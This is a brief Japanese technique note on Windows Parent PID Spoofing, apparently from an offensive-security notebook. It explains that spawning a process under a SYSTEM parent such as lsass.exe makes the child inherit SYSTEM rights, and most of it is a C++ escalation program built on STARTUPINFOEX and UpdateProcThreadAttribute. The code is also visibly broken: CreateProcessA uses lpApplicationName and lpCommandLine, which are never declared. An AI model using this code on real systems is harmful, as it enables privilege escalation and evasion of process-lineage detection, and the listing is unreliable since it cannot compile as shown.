# Parent PID Spoofing

新しく作成されるプロセスには作成元の親プロセスがあります。
例えば、普通にnotepad(子プロセス)を開けば、explorerが親プロセスになります。

## Escalation
子プロセスは親プロセスの設定を引き継ぎます。
なので、`nt authority\system`権限で作成されているプロセスの子プロセスとして作成することで子プロセスも同じ権限で作成することができます。

### STARTUPINFOEX
[STARTUPINFO](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa)の拡張で[STARTUPINFOEX](https://docs.microsoft.com/en-us/windows/win32/api/winbase/ns-winbase-startupinfoexa)があります。
これを使うことで新しく作成するプロセスの親プロセスを指定することが可能です。

### Flow
1. [InitializeProcThreadAttributeList](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist): 属性リストの初期化
1. [UpdateProcThreadAttribute](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute): 属性リストの更新
1. [CreateProcessA](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa): プロセスを作成

### Code
```cpp
#include <Windows.h>

typedef struct _PROC_THREAD_ATTRIBUTE_ENTRY
{
	DWORD_PTR   Attribute;
	SIZE_T      cbSize;
	PVOID       lpValue;
} PROC_THREAD_ATTRIBUTE_ENTRY, * LPPROC_THREAD_ATTRIBUTE_ENTRY;

typedef struct _PROC_THREAD_ATTRIBUTE_LIST
{
	DWORD                          dwFlags;
	ULONG                          Size;
	ULONG                          Count;
	ULONG                          Reserved;
	PULONG                         Unknown;
	PROC_THREAD_ATTRIBUTE_ENTRY    Entries[ANYSIZE_ARRAY];
} PROC_THREAD_ATTRIBUTE_LIST, * LPPROC_THREAD_ATTRIBUTE_LIST;

// Using: main.exe <Process id of lsass.exe>
int main(int argc, char* argv[]) {
  DWORD parentProcessId{ atoi(argv[1]) };
  LPSTARTUPINFOEXA lpsiex{ new STARTUPINFOEXA() };
  LPPROCESS_INFORMATION lppi{ new PROCESS_INFORMATION() };
  PSIZE_T lpSize{ new SIZE_T() };
  bool success{ false };

  SecureZeroMemory(lpsiex, sizeof(*lpsiex));
  SecureZeroMemory(lppi, sizeof(*lppi));

  success = InitializeProcThreadAttributeList(NULL, 1, 0, lpSize);
  if (success || *lpSize == 0)
    return false;

  lpsiex->lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *lpSize);
  if (lpsiex->lpAttributeList == nullptr) {
    HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, lpsiex->lpAttributeList);
    return false;
  }

  success = InitializeProcThreadAttributeList(lpsiex->lpAttributeList, 1, 0, lpSize);
  if (!success) {
    HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, lpsiex->lpAttributeList);
    return false;
  }

  HANDLE hProcess{ OpenProcess(MAXIMUM_ALLOWED, FALSE, parentProcessId) };
  if (!hProcess) {
    HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, lpsiex->lpAttributeList);
    return false;
  }

  success = UpdateProcThreadAttribute(
    lpsiex->lpAttributeList,
    0,
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
    &hProcess,
    sizeof(hProcess),
    nullptr,
    nullptr
  );

  lpsiex->StartupInfo.cb = sizeof(*lpsiex);

  bool result = CreateProcessA(
    lpApplicationName,
    lpCommandLine,
    nullptr,
    nullptr,
    false,
    EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
    nullptr,
    nullptr,
    &lpsiex->StartupInfo,
    lppi
  );

  if (lppi->hThread)
    CloseHandle(lppi->hThread);
  if (lppi->hProcess)
    CloseHandle(lppi->hProcess);
  HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, lpsiex->lpAttributeList);
  return result;
}
```